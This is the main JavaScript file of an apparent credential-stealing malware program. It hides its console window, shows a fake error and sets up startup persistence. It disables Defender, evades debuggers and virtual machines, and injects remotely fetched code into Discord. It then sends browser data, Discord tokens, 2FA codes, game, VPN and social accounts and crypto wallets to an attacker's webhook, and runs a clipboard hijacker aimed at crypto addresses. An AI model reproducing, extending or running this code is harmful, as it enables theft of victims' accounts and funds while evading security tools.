const antiDebug = require('./modules/antidebug/antidebug.js');
const antiDefender = require('./modules/antidefender/antidefender.js');
const antiVM = require('./modules/antivm/antivm.js');
const browsers = require('./modules/browsers/browsers.js');
const clipper = require('./modules/clipper/clipper.js');
const commonFiles = require('./modules/commonfiles/commonfiles.js');
const fakeError = require('./modules/fakeerror/fakeerror.js');
const games = require('./modules/games/games.js');
const hideConsole = require('./modules/hideconsole/hideconsole.js');
const discordInjection = require('./modules/injections/discord/discord.js');
const killProcess = require('./modules/killprocess/killprocess.js');
const socials = require('./modules/socials/socials.js');
const startup = require('./modules/startup/startup.js');
const stealCodes = require('./modules/stealcodes/stealcodes.js');
const system = require('./modules/system/system.js');
const discordTokens = require('./modules/tokens/tokens.js');
const vpns = require('./modules/vpns/vpns.js');
const wallets = require('./modules/wallets/wallets.js');
const wish = require('./modules/wish/wish.js');

const CONFIG = require('./config/config.js');
const program = require('./utils/program/program.js');

const execute = async (allow, ...args) => {
  try {
    await allow(...args);
  } catch (error) {
    console.error(error);
  }
};

const aurita = async () => {
  if (await program.IsWishRunning()) {
    process.exit(0);
  }

  await execute(hideConsole);
  await execute(program.HideSelf);

  if (!(await program.IsStartupDirRunning())) {
    await execute(fakeError);
    await execute(startup);
  }

  await execute(antiVM);
  await execute(antiDebug);
  await execute(antiDefender);
  await execute(killProcess);

  await execute(discordInjection, 'https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js', CONFIG.webhook, CONFIG.inject);

  await execute(system, CONFIG.webhook);
  await execute(browsers, CONFIG.webhook);
  await execute(commonFiles, CONFIG.webhook);
  await execute(stealCodes, CONFIG.webhook);
  await execute(discordTokens, CONFIG.webhook);
  await execute(games, CONFIG.webhook);
  await execute(wallets, CONFIG.webhook);
  await execute(vpns, CONFIG.webhook);
  await execute(socials, CONFIG.webhook);
  await execute(wish, CONFIG.webhook);

  await execute(clipper, CONFIG.cryptos);
};

aurita();
